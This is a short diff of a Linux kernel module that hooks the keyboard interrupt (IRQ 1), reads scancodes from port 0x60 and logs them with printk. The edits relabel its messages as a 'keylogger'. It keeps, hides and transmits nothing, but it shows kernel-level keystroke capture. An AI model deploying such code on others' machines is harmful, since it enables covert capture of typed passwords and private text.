@@ -14,18 +14,18 @@ irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
 	
 	scancode = inb (0x60);
 
-	printk ("You pressed %d !\n", scancode);
+	printk ("Received %d\n", scancode);
 
 	return (irq_handler_t) IRQ_HANDLED;
 }
 
 static int __init hello_init(void) {
-	printk(KERN_INFO "Hello World!\n");
+	printk(KERN_INFO "Keyboard keylogger initialized !\n");
 	return request_irq (1, (irq_handler_t) irq_handler, IRQF_SHARED, "my_keyboard_driver", (void *)(irq_handler));
 }
 
 static void __exit hello_cleanup(void) {
-	printk(KERN_INFO "Cleaning up module.\n");
+	printk(KERN_INFO "Destroying keylogger module.\n");
 	free_irq(1, (void *)(irq_handler));
 }
 
